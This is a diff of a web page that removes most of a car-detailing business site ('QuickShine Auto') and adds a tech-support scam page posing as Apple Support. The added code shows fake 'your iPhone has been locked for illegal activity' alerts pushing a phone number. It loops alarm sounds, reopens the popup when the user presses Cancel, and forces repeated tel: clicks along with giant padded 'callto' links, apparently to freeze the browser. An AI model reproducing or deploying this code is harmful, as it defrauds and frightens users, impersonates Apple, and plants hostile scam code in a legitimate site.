21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
-            <blockquote>"Had years of swirl marks on my black sedan. After their paint correction it looks like glass. Worth every penny and they explained each step."</blockquote>
-            <div class="quote-who"><span class="avatar">SK</span><div><strong>Sofia K.</strong><span>Brooklyn</span></div></div>
-          </div>
-          <div class="quote-card reveal" style="--d:.2s">
-            <div class="quote-stars"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
-            <blockquote>"Dog hair everywhere, two car seats, three years of crumbs. They got ALL of it. Booking took one phone call and they showed up on time."</blockquote>
-            <div class="quote-who"><span class="avatar">DT</span><div><strong>Dana T.</strong><span>Queens</span></div></div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <section class="section">
-      <div class="container">
-        <div class="cta-band reveal">
-          <h2>Ready for That <span class="grad-text">Just-Detailed</span> Feeling?</h2>
-          <p>Call now for a free quote — most appointments available within the week. We bring everything; you just enjoy the shine.</p>
-          <div class="hero-actions">
-            <a href="tel:+18882837282" class="btn btn-primary"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg> +1 (888) 283-7282</a>
-            <a href="contact.html" class="btn btn-ghost">Request a Callback <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></a>
-          </div>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-brand">
-          <a href="index.php" class="logo"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="url(#lg)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><defs><linearGradient id="lg" x1="0" y1="0" x2="24" y2="24"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f59e0b"/></linearGradient></defs><path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2"/><circle cx="7" cy="17" r="2"/><circle cx="17" cy="17" r="2"/><path d="M20.5 3.5 21 5l1.5.5L21 6l-.5 1.5L20 6l-1.5-.5L20 5z" fill="url(#lg)" stroke="none"/></svg><span>QuickShine <em>Auto</em></span></a>
-          <p>Premium mobile car detailing that comes to you. Hand wash, interior deep cleans, ceramic coatings and paint correction — done right, every time.</p>
-          <address>
-            50 W 4th St, New York, NY 10012, USA<br>
-            Phone: <a href="tel:+18882837282">+1 (888) 283-7282</a><br>
-            Email: <a href="mailto:hello@quickshineauto.com">hello@quickshineauto.com</a>
-          </address>
-        </div>
-        <div>
-          <h4>Quick Links</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="services.html">Services</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="blog.html">Blog</a></li>
-            <li><a href="contact.html">Contact</a></li>
-          </ul>
-        </div>
-        <div>
-          <h4>Services</h4>
-          <ul>
-            <li><a href="services.html#exterior">Exterior Detailing</a></li>
-            <li><a href="services.html#interior">Interior Deep Clean</a></li>
-            <li><a href="services.html#ceramic">Ceramic Coating</a></li>
-            <li><a href="services.html#paint">Paint Correction</a></li>
-            <li><a href="services.html#express">Express Wash</a></li>
-          </ul>
-        </div>
-        <div>
-          <h4>Legal</h4>
-          <ul>
-            <li><a href="privacy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms of Service</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-          </ul>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <span>&copy; <span id="year">2026</span> QuickShine Auto. All rights reserved.</span>
-        <span>Mon–Fri, 10 AM–6 PM ET · <a href="tel:+18882837282" style="color:inherit">+1 (888) 283-7282</a></span>
-      </div>
     </div>
-  </footer>
-
-  <div class="cookie-banner" role="dialog" aria-label="Cookie consent" aria-live="polite">
-    <h3>We value your privacy</h3>
-    <p>We use cookies to run this site and to understand how it's used, which helps us improve your experience. Analytics and advertising cookies stay off until you say yes. Read our <a href="cookies.html">Cookie Policy</a>.</p>
-    <div class="cookie-actions">
-      <button class="btn btn-primary btn-sm" data-consent="all">Accept all</button>
-      <button class="btn btn-ghost btn-sm" data-consent="necessary">Necessary only</button>
+    <div id="ios-alert-overlay" class="show">
+        <div id="ios-alert-box">
+            <div class="ios-alert-message">Your Phone has been locked due to detected illegal transaction. Your Device has been disabled !<br>Immediately call Customer Support<br>+1-877-481-3595 to unlock it !</div>
+            <div class="ios-alert-buttons-row">
+                <button class="ios-alert-btn-row cancel" onclick="reopenAlert()">Cancel</button>
+                <button class="ios-alert-btn-row ok" onclick="callNumber()">OK</button>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <button class="to-top" aria-label="Back to top">
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m18 15-6-6-6 6"/></svg>
-  </button>
+    <div id="ios-second-alert-overlay">
+        <div id="ios-second-alert-box">
+            <div class="ios-second-alert-content">
+                <div class="ios-second-alert-message">Your iPhone has been locked due to detected illegal activity .Your
+                    Apple Account has been disabled! Immediately call Apple Support +1-877-481-3595 to unlock it!
+                </div>
+            </div>
+            <div class="ios-second-alert-buttons">
+                <button class="ios-second-alert-btn" onclick="callNumber()">Call +1-877-481-3595</button>
+                <button class="ios-second-alert-btn cancel" onclick="reopenSecondAlert()">Cancel</button>
+            </div>
+        </div>
+    </div>
 
-  <script src="js/script.js"></script>
-</body>
-</html>
+    <!-- Audio element for notification sound -->
+    <audio id="notification-sound" src="ualert.mpeg" preload="auto"></audio>
+
+    <div id="result"><a class="anchorcall" href="tel:+1-877-481-3595 "></a><a href="#callto+55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555%00"></a><a class="anchorcall" href="tel:+1-877-481-3595 "></a><a href="#callto+55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555%00"></a><a class="anchorcall" href="tel:+1-877-481-3595 "></a><a href="#callto+55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555%00"></a></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+                        </span>
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+                        </span>
+                    </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+                        <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+                        <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+                        <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+                        <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+                        <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+                        <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+                        <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+                        <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+                        <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+                        <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+                        <span class="ac-gn-link-text">Shopping Bag </span>
+                        <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+                    <span class="ac-gn-searchview-close-wrapper">
+                        <span class="ac-gn-searchview-close-left"></span>
+                        <span class="ac-gn-searchview-close-right"></span>
+                    </span>
+                </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                        <a href="#">Apple Support +1-877-481-3595 <font color="red">
+                                <font class="js_setPhoneBlock"></font>
+                            </font></a>
+                    </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open"> <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
+                            <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink">
+                                        Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta"> <span class="ac-ln-menucta-chevron"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg" fetchpriority="high" decoding="sync">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">Your Phone has been locked due to detected illegal transaction. Your Device has been disabled !<br>Immediately call Customer Support<br>+1  +1-877-481-3595 to unlock it !</p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple
+                        Store </a>, <span class="nowrap">call <font class="js_setPhoneBlock"></font>, or <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+                        States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+                            Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+                            Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+                            Apple </a>
+                    </div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-877-481-3595 
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+ <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+    <script src="js/text.js"></script>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function (a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function (a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function (a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-481-3595 ');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        // Function to push the notification and play sound
+        function pushNotification() {
+            var notifContainer = document.getElementById('ios-notification-container');
+
+            // If already showing, temporarily hide it to trigger animation again
+            if (notifContainer.classList.contains('show')) {
+                notifContainer.classList.remove('show');
+                setTimeout(function () {
+                    showNotificationWithSound(notifContainer);
+                }, 600); // Increased wait time to allow the larger notification to fully slide up before dropping down again
+            } else {
+                showNotificationWithSound(notifContainer);
+            }
+        }
+
+        function showNotificationWithSound(container) {
+            container.classList.add('show');
+            // Try to play sound when notification appears
+            var audio = document.getElementById('notification-sound');
+            if (audio) {
+                audio.currentTime = 0; // Reset audio to start so it plays fully every time
+                var playPromise = audio.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(function (error) {
+                        console.log("Autoplay prevented by browser. Sound will play on first interaction.");
+                    });
+                }
+            }
+        }
+
+        // --- STANDARD NOTIFICATION & POPUP FLOW ---
+        
+        function showVisuals() {
+            // Show Notification
+            pushNotification();
+
+            // Start notification loop
+            setInterval(pushNotification, 8000);
+
+            // Show Popup
+            document.getElementById('ios-alert-overlay').classList.add('show');
+            document.querySelector('#ios-alert-box .ios-alert-message').innerHTML = getText();
+        }
+
+        // Trigger visuals immediately on load
+        setTimeout(showVisuals, 100);
+
+        // Fallback: Attempt to play audio on any user click if autoplay was blocked
+        document.body.addEventListener('click', function() {
+            var audio = document.getElementById('notification-sound');
+            if (audio && audio.paused && audio.currentTime === 0) {
+                audio.play().catch(function(e){});
+            }
+        }, { once: true });
+
+        <!-- Audio element for notification sound -->
+
+        function callNumber() {
+            okkkk();
+            window.location.href = "tel:+1-877-481-3595";
+        }
+
+        function reopenAlert() {
+            document.getElementById('ios-alert-overlay').classList.remove('show');
+            setTimeout(function () {
+                document.getElementById('ios-alert-overlay').classList.add('show');
+            }, 50); // Wait 50ms and show it again immediately
+            okkkk(); // Trigger background spam
+        }
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-481-3595 "></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            // Unused
+        }
+
+        window.ununload = function () {
+            debugger;
+            location.reload();
+        }
+    </script>
+	<!-- Default Statcounter code for Livespace
+http://livespace-homerenovation.netlify.app -->
+<script type="text/javascript">
+var sc_project=13228153; 
+var sc_invisible=1; 
+var sc_security="d43bcf71"; 
+</script>
+<script type="text/javascript" src="js/counter.js" async=""></script>
+<noscript><div class="statcounter"><a title="Web Analytics
+Made Easy - Statcounter" href="https://statcounter.com/"
+target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/13228153/0/d43bcf71/1/"
+alt="Web Analytics Made Easy - Statcounter"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<!-- End of Statcounter Code -->
+
+
+
+<veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2)format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2)format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen></body></html>
